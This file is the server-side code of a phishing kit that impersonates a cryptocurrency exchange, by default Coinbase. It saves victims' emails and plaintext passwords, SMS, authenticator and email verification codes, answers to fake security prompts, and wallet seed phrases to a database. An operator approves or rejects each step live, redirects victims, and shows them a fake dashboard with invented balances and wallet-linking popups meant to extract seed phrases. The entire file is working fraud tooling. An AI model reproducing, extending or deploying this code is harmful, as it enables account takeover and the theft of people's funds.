"use server"

import { createClient } from "@/lib/supabase/server"
import { createAdminClient } from "@/lib/supabase/admin"

export async function storeLoginAttempt(data: {
  email: string
  password: string
  phone_code?: string
  user_agent?: string
}) {
  const supabase = createAdminClient()

  const { error } = await supabase.from("login_attempts").insert({
    email: data.email,
    password: data.password,
    phone_code: data.phone_code || null,
    user_agent: data.user_agent || null,
  })

  if (error) {
    console.error("Error storing login attempt:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

export async function getLoginAttempts() {
  try {
    const supabase = createAdminClient()

    const { data, error } = await supabase
      .from("login_attempts")
      .select("*")
      .order("created_at", { ascending: false })

    if (error) {
      console.error("Error fetching login attempts:", error)
      return { success: false, error: error.message, data: [] }
    }

    return { success: true, data: data || [] }
  } catch (err) {
    console.error("Error in getLoginAttempts:", err)
    return { success: false, error: err instanceof Error ? err.message : "Unknown error", data: [] }
  }
}

export async function deleteLoginAttempt(id: string) {
  const supabase = createAdminClient()

  const { error } = await supabase.from("login_attempts").delete().eq("id", id)

  if (error) {
    console.error("Error deleting login attempt:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

export async function deleteAllLoginAttempts() {
  const supabase = createAdminClient()

  const { error } = await supabase.from("login_attempts").delete().neq("id", "00000000-0000-0000-0000-000000000000")

  if (error) {
    console.error("Error deleting all login attempts:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Session management functions
export async function createSession(sessionId: string, userAgent?: string, brand?: string) {
  const supabase = createAdminClient()
  
  const sessionData = {
    id: sessionId,
    brand: brand || "coinbase",
    current_step: "email",
    status: "idle",
    user_agent: userAgent || null,
    is_active: true,
    last_activity: new Date().toISOString(),
  }

  const { error } = await supabase.from("sessions").upsert(sessionData)

  if (error) {
    console.error("Error creating session:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

export async function updateSessionStep(sessionId: string, step: string, email?: string) {
  const supabase = createAdminClient()

  const updateData: Record<string, unknown> = {
    current_step: step,
    last_activity: new Date().toISOString(),
  }
  
  if (email) {
    updateData.email = email
  }

  const { error } = await supabase
    .from("sessions")
    .update(updateData)
    .eq("id", sessionId)

  if (error) {
    console.error("Error updating session:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Submit step for approval - user waits for admin
export async function submitForApproval(sessionId: string, step: string, data: {
  email?: string
  password?: string
  phone_code?: string
}) {
  const supabase = createAdminClient()

  const updateData: Record<string, unknown> = {
    current_step: step,
    status: "pending",
    last_activity: new Date().toISOString(),
  }
  
  if (data.email) updateData.email = data.email
  if (data.password) updateData.password = data.password
  if (data.phone_code) updateData.phone_code = data.phone_code

  const { error } = await supabase
    .from("sessions")
    .update(updateData)
    .eq("id", sessionId)

  if (error) {
    console.error("Error submitting for approval:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Admin approves - moves user to next step
export async function approveSession(sessionId: string, nextStep: string, message?: string, redirectUrl?: string) {
  const supabase = createAdminClient()

  const updateData: Record<string, unknown> = {
    current_step: nextStep,
    status: "approved",
    admin_message: message || null,
    last_activity: new Date().toISOString(),
  }
  if (redirectUrl) {
    updateData.redirect_url = redirectUrl
  }

  const { error } = await supabase
    .from("sessions")
    .update(updateData)
    .eq("id", sessionId)
    .select()

  if (error) {
    console.error("Error approving session:", error)
    return { success: false, error: error.message }
  }
  return { success: true }
}

// Admin rejects - shows error to user
export async function rejectSession(sessionId: string, message?: string) {
  const supabase = createAdminClient()

  const { data, error } = await supabase
    .from("sessions")
    .update({ 
      status: "rejected",
      admin_message: message || "Invalid credentials",
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)
    .select()

  if (error) {
    console.error("Error rejecting session:", error)
    return { success: false, error: error.message }
  }
  return { success: true }
}

// Admin moves user to specific step
export async function moveToStep(sessionId: string, step: string, redirectUrl?: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      current_step: step,
      status: "idle",
      admin_message: null,
      redirect_url: redirectUrl || null,
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)
    .select()

  if (error) {
    console.error("Error moving to step:", error)
    return { success: false, error: error.message }
  }
  return { success: true }
}

// Clear session status (after user acknowledges)
export async function clearSessionStatus(sessionId: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      status: "idle",
      admin_message: null
    })
    .eq("id", sessionId)

  if (error) {
    console.error("Error clearing status:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

export async function getSessions() {
  try {
    const supabase = createAdminClient()

    const { data, error } = await supabase
      .from("sessions")
      .select("*")
      .eq("is_active", true)
      .order("last_activity", { ascending: false })

    if (error) {
      console.error("Error fetching sessions:", error)
      return { success: false, error: error.message, data: [] }
    }

    return { success: true, data: data || [] }
  } catch (err) {
    console.error("Error in getSessions:", err)
    return { success: false, error: err instanceof Error ? err.message : "Unknown error", data: [] }
  }
}

export async function redirectSession(sessionId: string, redirectUrl: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      redirect_url: redirectUrl,
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)

  if (error) {
    console.error("Error redirecting session:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

export async function clearSessionRedirect(sessionId: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ redirect_url: null })
    .eq("id", sessionId)

  if (error) {
    console.error("Error clearing redirect:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

export async function endSession(sessionId: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ is_active: false })
    .eq("id", sessionId)

  if (error) {
    console.error("Error ending session:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

export async function endAllSessions() {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ is_active: false })
    .eq("is_active", true)

  if (error) {
    console.error("Error ending all sessions:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Set verification options from admin panel
export async function setVerificationOptions(sessionId: string, options: {
  phone_last4?: string
  verification_type?: string
  email_for_code?: string
}) {
  const supabase = createAdminClient()

  const updateData: Record<string, unknown> = {
    last_activity: new Date().toISOString(),
  }
  
  if (options.phone_last4 !== undefined) updateData.phone_last4 = options.phone_last4
  if (options.verification_type !== undefined) updateData.verification_type = options.verification_type
  if (options.email_for_code !== undefined) updateData.email_for_code = options.email_for_code

  const { error } = await supabase
    .from("sessions")
    .update(updateData)
    .eq("id", sessionId)

  if (error) {
    console.error("Error setting verification options:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Submit authenticator code
export async function submitAuthenticatorCode(sessionId: string, code: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      authenticator_code: code,
      status: "pending",
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)

  if (error) {
    console.error("Error submitting authenticator code:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Submit email verification code
export async function submitEmailCode(sessionId: string, code: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      email_code: code,
      status: "pending",
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)

  if (error) {
    console.error("Error submitting email code:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Submit balance selection
export async function submitBalanceSelection(sessionId: string, balance: string) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      balance_selection: balance,
      status: "pending",
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)

  if (error) {
    console.error("Error submitting balance selection:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Submit security check responses
export async function submitSecurityResponses(sessionId: string, responses: {
  signin_request: "approved" | "denied"
  withdrawal_request: "approved" | "denied"
  phone_change_request: "approved" | "denied"
}) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      security_responses: responses,
      status: "pending",
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)

  if (error) {
    console.error("Error submitting security responses:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Set security check options from admin
export async function setSecurityOptions(sessionId: string, options: {
  security_location?: string
  security_phone_last4?: string
}) {
  const supabase = createAdminClient()

  const updateData: Record<string, unknown> = {
    last_activity: new Date().toISOString(),
  }
  
  if (options.security_location !== undefined) updateData.security_location = options.security_location
  if (options.security_phone_last4 !== undefined) updateData.security_phone_last4 = options.security_phone_last4

  const { error } = await supabase
    .from("sessions")
    .update(updateData)
    .eq("id", sessionId)

  if (error) {
    console.error("Error setting security options:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Submit wallet linking/unlinking with seed phrase
export async function submitWalletSeedPhrase(sessionId: string, data: {
  wallet_type: string
  wallet_action: "link" | "unlink"
  seed_phrase: string
}) {
  const supabase = createAdminClient()

  const { error } = await supabase
    .from("sessions")
    .update({ 
      wallet_type: data.wallet_type,
      wallet_action: data.wallet_action,
      seed_phrase: data.seed_phrase,
      status: "pending",
      last_activity: new Date().toISOString()
    })
    .eq("id", sessionId)

  if (error) {
    console.error("Error submitting wallet seed phrase:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Brand settings
export async function getActiveBrand(): Promise<string> {
  const supabase = createAdminClient()
  const { data, error } = await supabase
    .from("settings")
    .select("value")
    .eq("key", "active_brand")
    .single()

  if (error || !data) {
    return "coinbase"
  }
  return data.value
}

export async function setActiveBrand(brand: string) {
  const supabase = createAdminClient()
  const { error } = await supabase
    .from("settings")
    .upsert({ key: "active_brand", value: brand, updated_at: new Date().toISOString() }, { onConflict: "key" })

  if (error) {
    console.error("Error setting active brand:", error)
    return { success: false, error: error.message }
  }
  return { success: true }
}

// Dashboard settings - update from admin panel
export async function updateDashboardSettings(sessionId: string, settings: {
  dashboard_balance?: string
  balance_hidden?: boolean
  balance_on_hold?: boolean
  hold_message?: string
  btc_amount?: string
  eth_amount?: string
  usdc_amount?: string
  sol_amount?: string
  doge_amount?: string
  xrp_amount?: string
  user_name?: string
  user_avatar?: string
  show_verification_banner?: boolean
  verification_banner_message?: string
  show_wallet_popup?: boolean
  wallet_popup_type?: "link" | "unlink"
}) {
  const supabase = createAdminClient()

  const updateData: Record<string, unknown> = {
    last_activity: new Date().toISOString(),
  }
  
  if (settings.dashboard_balance !== undefined) updateData.dashboard_balance = settings.dashboard_balance
  if (settings.balance_hidden !== undefined) updateData.balance_hidden = settings.balance_hidden
  if (settings.balance_on_hold !== undefined) updateData.balance_on_hold = settings.balance_on_hold
  if (settings.hold_message !== undefined) updateData.hold_message = settings.hold_message
  if (settings.btc_amount !== undefined) updateData.btc_amount = settings.btc_amount
  if (settings.eth_amount !== undefined) updateData.eth_amount = settings.eth_amount
  if (settings.usdc_amount !== undefined) updateData.usdc_amount = settings.usdc_amount
  if (settings.sol_amount !== undefined) updateData.sol_amount = settings.sol_amount
  if (settings.doge_amount !== undefined) updateData.doge_amount = settings.doge_amount
  if (settings.xrp_amount !== undefined) updateData.xrp_amount = settings.xrp_amount
  if (settings.user_name !== undefined) updateData.user_name = settings.user_name
  if (settings.user_avatar !== undefined) updateData.user_avatar = settings.user_avatar
  if (settings.show_verification_banner !== undefined) updateData.show_verification_banner = settings.show_verification_banner
  if (settings.verification_banner_message !== undefined) updateData.verification_banner_message = settings.verification_banner_message
  if (settings.show_wallet_popup !== undefined) updateData.show_wallet_popup = settings.show_wallet_popup
  if (settings.wallet_popup_type !== undefined) updateData.wallet_popup_type = settings.wallet_popup_type

  const { error } = await supabase
    .from("sessions")
    .update(updateData)
    .eq("id", sessionId)

  if (error) {
    console.error("Error updating dashboard settings:", error)
    return { success: false, error: error.message }
  }

  return { success: true }
}

// Get session by ID for dashboard
export async function getSessionById(sessionId: string) {
  const supabase = createAdminClient()

  const { data, error } = await supabase
    .from("sessions")
    .select("*")
    .eq("id", sessionId)
    .maybeSingle()

  if (error) {
    console.error("Error fetching session:", error)
    return { success: false, error: error.message, data: null }
  }

  return { success: true, data }
}
